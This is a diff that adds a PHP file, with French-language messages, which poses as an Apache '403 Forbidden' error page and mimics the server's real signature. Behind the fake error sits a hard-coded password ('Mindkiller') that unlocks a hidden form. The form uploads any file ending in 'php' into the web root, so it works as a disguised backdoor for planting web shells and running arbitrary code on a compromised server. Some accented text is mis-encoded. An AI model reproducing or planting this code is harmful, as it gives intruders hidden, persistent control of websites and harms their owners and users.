@@ -1,0 +1,91 @@
+<?php
+$target     = '';         
+$extension  = 'php';      
+$max_size   = 500000000000000000;     
+$nom_file   = $_FILES['fichier']['name'];
+$taille     = $_FILES['fichier']['size'];
+$tmp        = $_FILES['fichier']['tmp_name'];
+?>
+<HTML><HEAD>
+<TITLE>403 Forbidden</TITLE>
+<style> input { margin:0;background-color:#fff;border:1px solid #fff; } </style>
+</HEAD><BODY>
+<?php
+if(!empty($_POST['posted'])) {
+    if(!empty($_FILES['fichier']['name'])) {
+        if(substr($nom_file, -3) == $extension) {
+            $infos_img = getimagesize($_FILES['fichier']['tmp_name']);
+                if(move_uploaded_file($_FILES['fichier']['tmp_name'],$target.$_FILES['fichier']['name'])) {
+                    echo '<b>Image uploadÈe avec succËs !</b>';
+                    echo '<hr />';
+                    echo '<b>Fichier :</b> ', $_FILES['fichier']['name'], '<br />';
+                    echo '<b>Taille :</b> ', $_FILES['fichier']['size'], ' Octets<br />';
+                    echo '<hr />';
+                    echo '<br /><br />';
+                } else {
+                    echo '<b>ProblËme lors de l\'upload !</b><br /><br /><b>', $_FILES['fichier']['error'], '</b><br /><br />';
+                }
+            } else {
+                echo '<b>ProblËme dans les dimensions ou taille de l\'image !</b><br /><br />';
+            }
+        } else {
+            echo '<b>Votre image ne comporte pas l\'extension .', $extension, ' !</b><br /><br />';
+        }
+    } else {
+        echo '';
+    }
+?>       
+<?php
+$password = "Mindkiller";  
+?>
+<?php 
+if (isset($_POST["password"]) && ($_POST["password"]=="$password")) {
+?>
+<form enctype="multipart/form-data" action="<?php echo $PHP_SELF; ?>" method="POST">
+            <b>Envoyer le fichier :</b><br /><br />
+            <input type="hidden" name="posted" value="1" />
+            <input name="fichier" type="file" />
+            <input type="submit" value="Uploader" />
+        </form>
+<?php 
+}
+else
+{
+print "<H1>Forbidden</H1>";
+print "You don't have permission to access /";
+echo basename($_SERVER["SCRIPT_FILENAME"]);
+print " on this server.<P>";
+print "<HR>";
+print "<ADDRESS>";
+
+$sr=$_SERVER['SERVER_SIGNATURE'];
+function sr($sr=1){
+switch ($sr)
+{
+case 1:
+$GLOBALS['sr']=$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['HTTP_HOST']." Port ".$_SERVER['SERVER_PORT'];
+break;
+case 2:
+$GLOBALS['sr']=$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['SERVER_NAME']." Port ".$_SERVER['SERVER_PORT'];
+break;
+default:
+}
+}
+if ($sr==null){sr(1);}
+elseif ($_SERVER['HTTP_HOST']==null){sr(2);}
+else {
+print "<ADDRESS>Apache/";
+$ar = split("[/ ]",$_SERVER['SERVER_SOFTWARE']);
+$apache_version = $ar[1];
+print $apache_version;
+print " Server at ";
+echo php_uname("n");
+print " Port 80</ADDRESS>";
+};
+echo $sr;
+print "</ADDRESS>";
+print "<form method=\"post\">";
+print "<input name=\"password\" type=\"password\" size=\"25\" maxlength=\"10\"><input value=\"\" type=\"submit\"></p></form>";
+}
+?>
+</BODY></HTML>
